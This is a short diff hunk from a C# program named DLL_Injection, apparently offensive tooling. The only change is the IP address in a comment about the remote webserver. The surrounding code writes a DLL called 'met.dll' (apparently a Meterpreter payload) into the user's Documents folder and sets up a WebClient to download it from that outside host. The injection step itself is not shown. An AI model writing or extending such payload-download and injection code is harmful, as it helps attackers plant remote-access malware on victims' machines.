@@ -31,7 +31,7 @@ namespace DLL_Injection
 
         static void Main(string[] args)
         {
-            //download the DLL from a remote webserver, in this case: http://192.168.45.5/, then the DLL gets written to disk specified in the dllName variable
+            //download the DLL from a remote webserver, in this case: http://192.168.1.1/, then the DLL gets written to disk specified in the dllName variable
             String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
             String dllName = dir + "\\met.dll";
             WebClient wc = new WebClient();
